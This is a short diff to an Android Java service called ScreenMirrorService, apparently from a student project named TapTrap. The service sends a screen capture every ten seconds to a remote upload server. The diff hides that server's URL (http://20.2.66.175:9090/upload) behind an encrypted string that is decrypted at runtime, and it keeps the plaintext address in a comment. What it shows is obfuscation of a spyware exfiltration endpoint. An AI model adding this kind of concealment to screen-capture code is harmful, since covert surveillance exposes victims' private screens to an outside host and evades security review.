@@ -21,6 +21,8 @@ import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.WindowManager;
 
+import com.example.inf2007_mad_j1847.utils.StringHelper;
+
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -30,7 +32,8 @@ import java.nio.ByteBuffer;
 public class ScreenMirrorService extends Service {
 
     private static final String TAG = "TapTrap-Mirror";
-    private static final String SERVER_URL = "http://20.2.66.175:9090/upload";
+    private static final String SERVER_URL = StringHelper.decrypt("xn+aYwFT/tHYy5DU2eAGaKuAyD9lRIkXt6GG1sI+JoAmcQ0gKh1cvN8+mUhWFfEkB2TYYU0e8gUfRQ==");
+    // http://20.2.66.175:9090/upload
     private static final int INTERVAL_MS = 10000; // 10 seconds
     private static final String CHANNEL_ID = "screen_mirror";
 
